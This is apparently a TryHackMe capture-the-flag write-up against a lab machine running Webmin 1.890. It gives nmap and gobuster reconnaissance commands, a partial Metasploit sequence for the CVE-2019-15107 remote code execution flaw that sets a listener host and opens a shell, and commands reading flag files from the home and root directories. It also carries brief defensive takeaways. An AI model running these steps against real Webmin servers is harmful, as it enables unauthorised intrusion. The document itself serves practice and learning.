# source

<!-- brain:report -->
- **Platform** TryHackMe
- **Difficulty** Easy
- **Source status** Documented

## Report overview

The observations in this case inform a review of vulnerability remediation and service and share exposure.

## Defensive takeaways

- Match the deployed version to an authoritative advisory and verify the version or compensating control after remediation.
- Confirm the intended audience for network services and shares, then compare their permissions and reachability with that policy.

## Defensive references

- [Vulnerability remediation review](../../../defense/playbooks/vulnerability-remediation.md)
- [Exposed service and share hardening](../../../defense/techniques/service-exposure-review.md)

<!-- /brain:report -->

---


**Platform:** TryHackMe  
**Difficulty:** Easy  
**Status:** Complete

## Reconnaissance
```bash
nmap -sS -p- --min-rate 4000 -n -Pn $TARGET -oN silent
nmap -sVC -p22,10000 $TARGET -oN service
```

**Output**
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web fuzzing
```bash
 gobuster dir -u https://$TARGET:10000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -k -x .cgi,.php -xl 3727
```

## Explotation Webmin
Full technique: [Webmin CVE-2019-15107 RCE](../../../exploits/web-rce/webmin-cve-2019-15107-rce.md). Tool note: [Metasploit](../../../tools/exploitation/metasploit.md).

```bash
msfconsole -q
set LHOST $LHOST
set RHOST $RHOST
set SSL true
shell
```

## Grab flags
```bash
cat /home/dark/user.txt 
cat /root/root.txt
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [Metasploit](../../../tools/exploitation/metasploit.md)
- [Webmin CVE-2019-15107 RCE](../../../exploits/web-rce/webmin-cve-2019-15107-rce.md)
